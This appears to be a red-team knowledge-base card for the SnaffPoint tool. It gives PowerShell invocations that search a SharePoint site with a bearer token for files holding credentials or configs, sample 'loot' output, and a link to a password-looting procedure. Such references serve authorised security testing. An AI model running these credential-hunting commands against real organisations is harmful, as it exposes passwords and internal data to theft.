---
id: 3595da96-76ba-4214-8cd8-fa477993110d
name: search-sharepoint-with-preset-queries
type: command
executor: powershell
data: '.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token'
output: null
created_at: '2023-04-06T03:56:28.947949+00:00'
updated_at: '2023-10-10T20:37:31.881047+00:00'
platforms:
  - Windows
tags:
  - search
  - looting
  - sharepoint
verified: true
validated: true
---

# search-sharepoint-with-preset-queries

## Command

```powershell
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
```

## Description

This command runs SnaffPoint to search a SharePoint site using predefined query presets from the ./presets directory. It identifies files matching loot patterns like credentials or configs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | SharePoint site URL | Yes |
| -t | Bearer token for authentication | Yes |

## Examples

### Basic Usage

```powershell
.\SnaffPoint.exe -u "https://contoso.sharepoint.com" -t $token
```

### Advanced Usage

With verbose output:
```powershell
.\SnaffPoint.exe -u "https://contoso.sharepoint.com" -t $token -v
```

## Expected Output

Console output listing scanned sites, matched files, and loot details, e.g., "[LOOT] config.xml at /sites/shared - Contains 'password='". Files may be downloaded to output dir.

## Related

- [[procedures/Password-Looting-from-SharePoint-and-SMB-Shares]]
- [[tools/SnaffPoint]]
